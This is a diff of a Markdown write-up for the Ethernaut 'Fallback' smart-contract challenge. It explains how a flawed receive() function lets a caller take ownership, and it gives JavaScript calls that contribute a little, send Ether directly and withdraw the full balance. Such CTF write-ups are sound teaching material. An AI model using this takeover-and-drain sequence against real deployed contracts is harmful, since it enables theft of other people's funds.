@@ -58,29 +58,27 @@ receive() external payable {
 ```
 Any user who sends Ether and has a contribution greater than 0 becomes the new owner. This allows the attacker to bypass the intended contract logic.
 ### Attack Steps
-1) Make a small contribution:
+#### 1) Make a small contribution:
 ```js
 await contract.contribute({
     value: toWei("0.0001"),
 });
 ```
-2) Send a direct Ether transfer to the contract:
+#### 2) Send a direct Ether transfer to the contract:
 ```js
 await contract.sendTransaction({
     value: toWei("0.0001"),
 });
 ```
 After this, you become the owner of the contract!
-3) Withdraw the entire balance:
+#### 3) Withdraw the entire balance:
 ```js
 await contract.withdraw();
 ```
 # Recommendations
 Avoid implementing fallback or receive functions that contain conflicting or unintended logic.
-.+ сделать чтобы receive() вызывала contribute
 # Conclusion
 The level demonstrates how a poorly implemented receive (fallback) function can compromise contract ownership allow fund theft.
 # Notes
 [Ethernaut Fallback Level](https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB)
 
-Возможно немного добавить рекомендации, мб идентифицировать что за вулна и вставить сюда 
